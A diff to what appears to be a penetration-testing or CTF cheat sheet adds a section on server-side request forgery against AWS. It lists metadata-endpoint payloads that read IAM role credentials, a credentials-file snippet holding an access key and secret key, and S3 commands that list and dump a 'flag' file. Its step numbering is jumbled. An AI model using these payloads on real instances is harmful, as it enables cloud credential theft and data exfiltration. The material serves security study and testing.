@@ -268,10 +268,36 @@ Summary: Attacker can make requests from a server to target its internal systems
 
 
 ---
-### Amazon Web Services
+### Amazon Web Services SSRF
 ---
 
+Confirm SSRF with `http://169.254.169.254` as the payload.
 
+Typical Steps:
+1. Find info / dump data in AWS instance.
+  * `http://169.254.169.254/latest/meta-data/iam/info`   // Find an IAM role with access to the AWS resources.
+  * OR `http://169.254.169.254/latest/user-data`
+2. Find AWS Access Keys.
+  * `http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]`
+  * Info retrieved should contain:
+    * AccessKeyId: { access key ID {
+    * SecretAccessKey: { secret access key }
+    * Token { session token }
+    * Expiration { expiry information }
+4. Go to `~/.aws/credentials`
+  * Add in:
+  ```
+  aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
+  aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
+  aws_session_token = {really long access token string}
+  ```
+3. Enumerate s3 bucket content.
+  * `aws s3 ls s3://ns.agency`
+4. Dump a flag or file content to stdout or download it
+  * `aws s3 cp s3://ns.agency/flag -`    // dump to stdout
+  * `aws s3 cp s3://ns.agency/flag .`    // download to current working dir
+
+More info on AWS testing: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3
 
 ---
 ### REST APIs
